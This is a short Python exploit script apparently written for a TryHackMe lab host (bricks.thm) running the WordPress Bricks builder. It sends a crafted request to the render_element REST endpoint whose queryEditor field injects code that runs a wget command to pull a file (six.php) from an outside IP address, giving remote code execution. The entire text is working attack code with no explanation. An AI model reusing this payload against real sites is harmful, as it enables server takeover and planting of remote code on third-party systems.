
import requests
import json




def send_request():
    url = "https://bricks.thm/wp-json/bricks/v1/render_element"
    headers = {"Content-Type": "application/json"}
    data = {
        "postId": "1",
        "nonce": "9bbef0a32a",
        "element": {
            "name": "container",
            "settings": {
                "hasLoop": "true",
                "query": {
                    "useQueryEditor": True,
                    "queryEditor": "throw new Exception(`wget http://10.2.116.12:8000/six.php`);",
                    "objectType": "post"
                }
            }
        }
    }
    response = requests.post(url, headers=headers, json=data, verify=False)
    return response.text

if __name__ == '__main__':
    print(send_request())
